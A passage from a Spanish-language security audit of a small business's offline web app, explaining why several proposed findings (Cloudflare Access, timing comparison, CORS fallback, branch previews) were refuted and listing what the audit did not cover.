  `RESPALDO_KEYS` no las lista.
- **El correo en la consulta a Nominatim no es un descuido**: la política de uso de
  OpenStreetMap exige un contacto identificable. Lo mismo con el `Referer`, que es la razón de
  que el `Referrer-Policy` no sea `no-referrer`.
- **La CSP no rompe nada.** Comprobado en Chromium con las cabeceras reales: cero violaciones
  abriendo el cotizador, capturando una partida y recorriendo mapa, agenda, material y
  ajustes; el service worker guarda sus 34 archivos y las dos apps abren en modo avión con las
  URL limpias que sirve Cloudflare Pages.

---

## Lo que se refutó

Veintitrés hallazgos no sobrevivieron al juez. Los que más vale la pena dejar escritos,
porque van a volver a aparecer:

**«Poner la app detrás de Cloudflare Access.»** Suena a la medida más fuerte disponible y es
la peor idea del lote. Access intercepta las peticiones y las manda a una pantalla de login en
otro dominio; el `install` del service worker hace `addAll` sobre 34 archivos y eso es
todo-o-nada por diseño. La plataforma se quedaría congelada en la versión anterior, o —en una
primera instalación— el teléfono se quedaría sin service worker, que es lo mismo que decir sin
el cotizador sin señal, que es la única razón por la que ese archivo existe. Y no protegería
nada: los datos están en los teléfonos y el código ya es público. Sí vale la pena, en cambio,
sobre las **vistas previa** de las ramas.

**«La comparación del token no es de tiempo constante.»** Cierto y sin consecuencia: es un
acceso a una propiedad de un objeto de tres claves, no una comparación byte a byte, y del otro
lado hay una red pública. Medir esa diferencia a través de internet no es un ataque, es una
tesis.

**«`__proto__` como token.»** Falla cerrado por el `ESCRIBIBLES[rol]` de la línea siguiente.

**«El `Access-Control-Allow-Origin` de respaldo deja leer la respuesta a cualquier página.»**
No. Devolver el primer origen de la lista cuando el que pide no está en ella hace que el
navegador bloquee la respuesta, que es lo correcto. Lo que sí produce es un diagnóstico
imposible —un dominio mal escrito se ve exactamente igual que «no hay señal»— y por eso el
parche 1 sigue valiendo la pena, pero por claridad, no por seguridad.

**«Las vistas previa de Pages exponen el repositorio.»** El repositorio ya es público. El
delta de exposición es cero. Lo que sí hacen es invitar a que alguien instale por error una
cuarta copia vacía de la app en su teléfono, y ese es el motivo real para cerrarlas.

**«Hay que redirigir a los teléfonos viejos con `clients.navigate()`.»** No funciona:
`WindowClient.navigate()` solo acepta URL del mismo origen. Con una cruzada la promesa se
rechaza y nadie se entera. El aviso tiene que darlo el HTML.

Y seis hallazgos más se refutaron por una razón que dice algo del método: describían como
pendiente el `_headers` que se escribió mientras la auditoría corría. Aparecen aquí para que
nadie los reviva leyendo un informe viejo.

---

## Lo que este informe no cubre

- **No se probó nada contra el Worker en producción.** Todo lo del puente sale de leer
  `puente/worker.js` y de correr `pruebas/worker.mjs` contra una Notion de mentiras. Nadie
  mandó una sola petición al Worker real.
- **No se auditó Notion.** Los permisos del workspace, quién más tiene acceso a la página
  «Finanzas - AL3D» y qué ve la integración quedan fuera.
- **No se revisó el `index.html` renglón por renglón.** Son 900 KB; se buscó por patrones de
  riesgo, y el crítico de completitud encontró cosas que las nueve revisiones no vieron, lo
  cual sugiere que quedan más.
- **Nada de esto es una opinión legal.** Lo que dice de la LFPDPPP viene de leer la ley y su
  reglamento, y está calibrado para un negocio de tres personas, pero un aviso de privacidad
  lo revisa alguien que sepa.
